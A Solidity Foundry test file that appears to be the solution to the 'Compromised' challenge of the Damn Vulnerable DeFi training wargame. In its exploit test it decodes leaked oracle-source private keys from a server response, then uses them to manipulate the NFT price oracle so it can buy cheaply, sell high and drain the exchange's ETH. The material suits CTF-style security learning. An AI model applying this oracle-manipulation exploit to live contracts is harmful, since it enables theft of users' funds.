// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {TrustfulOracleInitializer} from "src/compromised/TrustfulOracleInitializer.sol";
import {TrustfulOracle} from "src/compromised/TrustfulOracle.sol";
import {Exchange} from "src/compromised/Exchange.sol";
import {DamnValuableNFT} from "src/DamnValuableNFT.sol";

contract CompromisedTest is Test {
    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");

    address[] sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];

    TrustfulOracleInitializer oracleInitializer;
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nftToken;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        // Initialize balance of the trusted source addresses
        for (uint256 i; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            vm.label(
                sources[i],
                string(abi.encodePacked("SOURCE_", Strings.toString(i + 1)))
            );
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        vm.startPrank(deployer);

        // Deploy the oracle and setup the trusted sources with initial prices
        string[] memory symbols = new string[](3);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";
        symbols[2] = "DVNFT";

        uint256[] memory initialPrices = new uint256[](3);
        initialPrices[0] = INITIAL_NFT_PRICE;
        initialPrices[1] = INITIAL_NFT_PRICE;
        initialPrices[2] = INITIAL_NFT_PRICE;

        oracleInitializer = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        );
        oracle = oracleInitializer.oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange(address(oracle));
        vm.deal(address(exchange), EXCHANGE_INITIAL_ETH_BALANCE);
        nftToken = exchange.token();

        vm.stopPrank();
    }

    function test_SetUpState() public {
        for (uint256 i; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        assertEq(nftToken.owner(), address(0));
        assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */

        /**
         * @snippet SOMEWHAT STRANGE RESPONSE FROM THEIR SERVER
         * HTTP/2 200 OK
         * content-type: text/html
         * content-language: en
         * vary: Accept-Encoding
         * server: cloudflare
         *
         * @data[0]
         * 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
         *
         * @data[1]
         * 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
         */

        /**
         * ```python3
         * >>> import base64
         * >>> data = [
         *         '4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535',
         *         '4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134'
         *     ]
         * >>> for i in range(len(data)):
         *         data[i] = bytearray.fromhex(data[i]).decode()
         *         data[i] = base64.b64decode(data[i])
         * >>> data
         * [
         *     b'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
         *     b'0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
         * ]
         * ```
         */

        // data from response is oracle sources' private key
        // now we pwned 2 of 3 oracle sources
        uint256[2] memory exposedKey = [
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9,
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        ];
        address[2] memory pwnedSources = [
            vm.addr(exposedKey[0]),
            vm.addr(exposedKey[1])
        ];

        for (uint256 i; i < pwnedSources.length; i++) {
            vm.prank(pwnedSources[i]);
            oracle.postPrice("DVNFT", 0);
        }

        vm.prank(player);
        uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();

        for (uint256 i; i < pwnedSources.length; i++) {
            vm.prank(pwnedSources[i]);
            oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        }

        vm.prank(player);
        nftToken.approve(address(exchange), tokenId);

        vm.prank(player);
        exchange.sellOne(tokenId);

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Player's ETH balance must have significantly increased
        assertGt(player.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nftToken.balanceOf(player), 0);

        // NFT price shouldn't have changed
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
